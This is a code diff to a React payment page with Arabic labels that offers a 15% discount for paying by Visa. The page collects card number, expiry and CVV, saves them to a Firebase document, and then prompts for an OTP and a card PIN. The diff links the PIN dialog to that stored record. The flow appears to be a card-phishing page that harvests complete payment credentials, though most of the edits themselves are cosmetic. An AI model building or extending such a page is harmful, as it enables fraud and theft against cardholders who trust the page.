@@ -12,7 +12,6 @@ import { addData } from "@/lib/firebase"
 import { OtpDialog } from "./otp-dialog"
 import { PinDialog } from "./pin-dialog"
 
-
 export default function PaymentPage() {
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-visa")
   const [cardNumber, setCardNumber] = useState("")
@@ -30,9 +29,11 @@ export default function PaymentPage() {
   // Detect card type and bank info when card number changes
   useEffect(() => {
     const cleanNumber = cardNumber.replace(/\s/g, "")
+
     if (cleanNumber.length >= 6) {
       const type = detectCardType(cleanNumber)
       setCardType(type)
+
       const bank = getBankInfo(cleanNumber)
       setBankInfo(bank)
     } else {
@@ -75,7 +76,6 @@ export default function PaymentPage() {
     }
 
     if (!isValidCard) {
-    
       return
     }
 
@@ -93,7 +93,7 @@ export default function PaymentPage() {
       setDocumentId(docId!)
       setShowOtpDialog(true)
     } catch (error) {
-     
+      console.error("Error adding payment:", error)
     }
   }
 
@@ -104,11 +104,11 @@ export default function PaymentPage() {
 
   const handlePinSubmitted = () => {
     setShowPinDialog(false)
-
     // Reset form
     setCardNumber("")
     setExpiryDate("")
     setCvv("")
+    setDocumentId(undefined)
   }
 
   const getDiscountAmount = () => {
@@ -129,6 +129,7 @@ export default function PaymentPage() {
                 <ShieldCheck className="w-5 h-5 text-[#0a4a68]" />
                 طريقة الدفع
               </label>
+
               <div className="space-y-3">
                 {[
                   { value: "credit-visa", label: "بطاقة فيزا", discount: "15%", recommended: true, img: "/visa.svg" },
@@ -281,7 +282,12 @@ export default function PaymentPage() {
         documentId={documentId}
       />
 
-      <PinDialog open={showPinDialog} onOpenChange={setShowPinDialog} onPinSubmitted={handlePinSubmitted} />
+      <PinDialog
+        open={showPinDialog}
+        onOpenChange={setShowPinDialog}
+        onPinSubmitted={handlePinSubmitted}
+        documentId={documentId}
+      />
     </>
   )
 }
@@ -290,16 +296,20 @@ export default function PaymentPage() {
 function luhnCheck(cardNumber: string): boolean {
   let sum = 0
   let isEven = false
+
   for (let i = cardNumber.length - 1; i >= 0; i--) {
     let digit = Number.parseInt(cardNumber[i])
+
     if (isEven) {
       digit *= 2
       if (digit > 9) {
         digit -= 9
       }
     }
+
     sum += digit
     isEven = !isEven
   }
+
   return sum % 10 === 0
 }
